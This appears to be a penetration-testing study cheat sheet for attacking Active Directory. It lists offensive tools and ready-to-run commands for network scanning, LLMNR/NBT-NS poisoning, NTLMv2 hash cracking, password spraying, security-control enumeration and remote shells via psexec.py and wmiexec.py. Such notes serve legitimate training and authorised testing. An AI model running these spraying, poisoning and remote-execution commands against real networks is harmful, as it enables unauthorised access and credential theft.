---
layout: default
---
# Active Directory Enumeration and Attacks
* * *

# Tools

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)  A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.   

[BloodHound](https://github.com/BloodHoundAD/BloodHound)  Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) database for graphical analysis of the AD environment.   

[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)  The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.   

[BloodHound.py](https://github.com/fox-it/BloodHound.py)   A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis.   

[Kerbrute](https://github.com/ropnop/kerbrute)   A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing.   

[Impacket toolkit](https://github.com/SecureAuthCorp/impacket)    A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.   

[Responder](https://github.com/lgandx/Responder)  Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions.    

[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)  Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.   

[C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)  The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes.   

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)  A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.      

[CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)   CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL.   

[Rubeus](https://github.com/GhostPack/Rubeus)   Rubeus is a C# tool built for Kerberos Abuse.    

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)  Another Impacket module geared towards finding Service Principal names tied to normal users.   

[Hashcat](https://hashcat.net/hashcat/)            A great hashcracking and password recovery tool.   

[enum4linux](https://github.com/CiscoCXSecurity/enum4linux)  A tool for enumerating information from Windows and Samba systems.   

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)  A rework of the original Enum4linux tool that works a bit differently.   

[ldapsearch](https://linux.die.net/man/1/ldapsearch)  Built in interface for interacting with the LDAP protocol.   

[windapsearch](https://github.com/ropnop/windapsearch)    A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.   

[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)  DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.   

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)  The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).    

[smbmap](https://github.com/ShawnDEvans/smbmap)  SMB share enumeration across a domain.   

[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)  Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell.   
[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)  Part of Impacket toolset, it provides the capability of command execution over WMI.   

[Snaffler](https://github.com/SnaffCon/Snaffler)  Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.   

[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)  Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.   
[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))  Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.   

[Mimikatz](https://github.com/ParrotSec/mimikatz)  Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host.   

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)  Remotely dump SAM and LSA secrets from a host.   

[evil-winrm](https://github.com/Hackplayers/evil-winrm)  Provides us with an interactive shell on host over the WinRM protocol.   

[mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)  Part of Impacket toolset, it provides the ability to interact with MSSQL databases.   

[noPac.py](https://github.com/Ridter/noPac)  Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.   

[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)  Part of the Impacket toolset, RPC endpoint mapper.   

[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)  Printnightmare PoC in python.   

[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)  Part of the Impacket toolset, it performs SMB relay attacks.   

[PetitPotam.py](https://github.com/topotam/PetitPotam)  PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.   

[gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)  Tool for manipulating certificates and TGTs.   

[getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)  This tool will use an existing TGT to request a PAC for the current user using U2U.   

[adidnsdump](https://github.com/dirkjanm/adidnsdump)  A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer.   

[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)  Extracts usernames and passwords from Group Policy preferences.   

[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)  Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set.   

[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)  SID bruteforcing tool.   

[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)  A tool for creation and customization of TGT/TGS tickets.   

[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)  Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation.   

[Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)  Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.   

[PingCastle](https://www.pingcastle.com/documentation/)  Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).   

[Group3r](https://github.com/Group3r/Group3r)  Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).            

[ADRecon](https://github.com/adrecon/ADRecon)  A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.   

* * *

## Initial Enumeration

```
nslookup abc.com
```
> Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.

```
sudo tcpdump -i tun0
```
> Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.

```
sudo responder -I tun0 -A
```
> Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host

```
fping -asgq 10.10.10.1/24**
```
> Performs a ping sweep on the specified network segment from a Linux-based host.

```
sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum
```
> Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host

```
sudo git clone https://github.com/ropnop/kerbrute.git
```
> Uses git to clone the kerbrute tool from a Linux-based host.

```
make help
```
> Used to list compiling options that are possible with make from a Linux-based host.

```
sudo make all
``` 
> Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures.

```
./kerbrute_linux_amd64
```
> Used to test the chosen complied Kebrute binary from a Linux-based host.

```
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
> Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.

```
./kerbrute_linux_amd64 userenum -d abc.com --dc 10.10.10.10 abc.txt -o kerb-results
```
> Runs the Kerbrute tool to discover usernames in the domain  specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.  

* * *

## LLMNR/NTB-NS Poisoning

```
responder -h
```
> Used to display the usage instructions and various options available in Responder from a Linux-based host.

```
hashcat -m 5600 _hash_ /usr/share/wordlists/rockyou.txt
```
> Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file. The cracking is done based on a specified wordlist.

```
Import-Module .\Inveigh.ps1
```
> Using the Import-Module PowerShell cmd-let to import the Windows-based tool Inveigh.ps1.

```
(Get-Command Invoke-Inveigh).Parameters 
```
> Used to output many of the options & functionality available with Invoke-Inveigh. Peformed from a Windows-based host.

```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
> Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.

```
.\Inveigh.exe 
```
> Starts the C# implementation of Inveigh from a Windows-based host.

```
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
> PowerShell script used to disable NBT-NS on a Windows host.

* * *

## Password Spraying & Password Policies 

```
crackmapexec smb 10.10.10.10 -u test -p Password123 --pass-pol
```
> Uses CrackMapExec and valid credentials to enumerate the password policy (--pass-pol) from a Linux-based host.

```
rpcclient -U "" -N 10.10.10.10**
```
> Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.

```
rpcclient $> querydominfo 	
```
> Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.

```
enum4linux -P 10.10.10.10
```
> Uses enum4linux to enumerate the password policy (-P) in a target Windows domain from a Linux-based host.

```
enum4linux-ng -P 10.10.10.10 -oA output
```
> Uses enum4linux-ng to enumerate the password policy (-P) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the -oA option.

```
ldapsearch -h <ip> -x -b "<>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
> Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.

```
net accounts
```
> Used to enumerate the password policy in a Windows domain from a Windows-based host.

```
Import-Module .\PowerView.ps1
```
> Uses the Import-Module cmd-let to import the PowerView.ps1 tool from a Windows-based host.

```
Get-DomainPolicy 
```
> Used to enumerate the password policy in a target Windows domain from a Windows-based host.

```
enum4linux -U <ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
> Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host.

```
rpcclient -U "" -N <ip> rpcclient 
$> enumdomuser 	
```
> Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.

```
crackmapexec smb <ip> --users 
```
> Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.

```
ldapsearch -h <ip> -x -b "<>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
> Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.

```
./windapsearch.py --dc-ip <ip> -u "" -U**
```
> Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host.

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <ip> | grep Authority; done
``` 	
> Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner.

```
kerbrute passwordspray -d <domain> --dc <ip> valid_users.txt Welcome1
```
> Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.

```
sudo crackmapexec smb <ip> -u valid_users.txt -p Password123 | grep +

```
> Uses CrackMapExec and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using grep.

```
sudo crackmapexec smb <ip> -u <username> -p <password> 
```
> Uses CrackMapExec to validate a set of credentials from a Linux-based host.

```
sudo crackmapexec smb --local-auth <ip/cidr> -u administrator -H <hash> | grep +
```
> Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.

```
Import-Module .\DomainPasswordSpray.ps1
```
> Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host.

```
Invoke-DomainPasswordSpray -Password <pass> -OutFile spray_success -ErrorAction SilentlyContinue
```
> Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.

* * *

## Enumerating Security Controls

```
Get-MpComputerStatus
``` 	
> PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
> PowerShell cmd-let used to view AppLocker policies from a Windows-based host.

```
$ExecutionContext.SessionState.LanguageMode
```
> PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. Performed from a Windows-based host.

```
Find-LAPSDelegatedGroups
``` 	
> A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host.

```
Find-AdmPwdExtendedRights
```
> A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.

```
Get-LAPSComputers
``` 	
> A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.

* * *

## Credentialed Enumeration

```
xfreerdp /u:<user>@<domain> /p:<pass> /v:<ip>
``` 	
> Connects to a Windows target using valid credentials. Performed from a Linux-based host.

```
sudo crackmapexec smb <ip> -u <user> -p <pass> --users
``` 	
> Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (--users) in a target Windows domain. Performed from a Linux-based host.

```
sudo crackmapexec smb <ip> -u <user> -p <pass> --groups
```
> Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (--groups) in a target Windows domain. Performed from a Linux-based host.

```
sudo crackmapexec smb <ip> -u <user> -p <pass> --loggedon-users
```
> Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (--loggedon-users) on the target Windows host. Performed from a Linux-based host.

```
sudo crackmapexec smb <ip> -u <user> -p <pass> --shares
``` 	
> Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (--shares). Performed from a Linux-based host.

```
sudo crackmapexec smb <ip> -u <user> -p <pass> -M spider_plus --share Dev-share
``` 	
> Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host.

```
smbmap -u <user> -p <pass> -d <domain> -H <ip>
```	
> Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (-H). Performed from a Linux-based host.

```
smbmap -u <user> -p <pass> -d <domain> -H <ip>  -R SYSVOL --dir-only
```
> Enumerates the target Windows domain using valid credentials and performs a recursive listing (-R) of the specified share (SYSVOL) and only outputs a list of directories (--dir-only) in the share. Performed from a Linux-based host.

```
rpcclient $> queryuser 0x457
``` 	
> Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host.

```
rpcclient $> enumdomusers
``` 	
> Discovers user accounts in a target Windows domain and their associated relative identifiers (rid). Performed from a Linux-based host.

```
psexec.py <domain>/<user>:<pass>@<ip>
``` 	
> Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host.

```
wmiexec.py <domain>/<user>:<pass>@<ip>
```
> Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host.

```
windapsearch.py -h
``` 	
> Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.

```
python3 windapsearch.py --dc-ip <ip> -u <domain>\<username> -p <pass> --da
```
> Used to enumerate the domain admins group (--da) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.

```
python3 windapsearch.py --dc-ip <ip> -u <domain>\<username> -p <pass> -PU 	
```
> Used to perform a recursive search (-PU) for users with nested permissions using valid credentials. Performed from a Linux-based host.

```
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <ns-ip> -d <domain> -c all
``` 	
> Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host.

* * *
